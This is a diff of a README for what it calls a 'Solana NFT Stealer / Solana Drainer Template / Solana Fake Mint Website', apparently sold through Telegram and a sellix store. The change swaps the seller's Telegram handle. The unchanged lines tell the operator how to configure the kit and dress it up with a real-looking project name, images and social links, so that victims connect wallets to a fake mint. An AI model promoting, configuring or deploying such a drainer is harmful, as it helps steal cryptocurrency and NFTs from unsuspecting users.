@@ -1,5 +1,5 @@
 # ⚠️ This source don't have any back doors !
-### If you need any help, DM me here: [@anondrainers](https://t.me/anondrainers)
+### If you need any help, DM me here: [@draingold](https://t.me/draingold)
 
 ## 🖼️ Solana NFT Stealer / Solana Drainer Template / Solana Fake Mint Website
 
@@ -22,9 +22,9 @@ You need to edit the **main(website-files)/config.js** file to change the **sola
 - open all images folders and put your project images, but rename name as it was before.
 - open index.html, to edit the proejct discord & twitter link, how many mints left or total supply and the project name also.
 
-To get instant support, contact me on [@anondrainers](https://t.me/anondrainers)
+To get instant support, contact me on [@draingold](https://t.me/draingold)
 
 # ⭐ Socials:
 
-- TELEGRAM: [@anondrainers](https://t.me/anondrainers)
+- TELEGRAM: [@draingold](https://t.me/draingold)
 - STORE: https://tecdrainers.sellix.io/
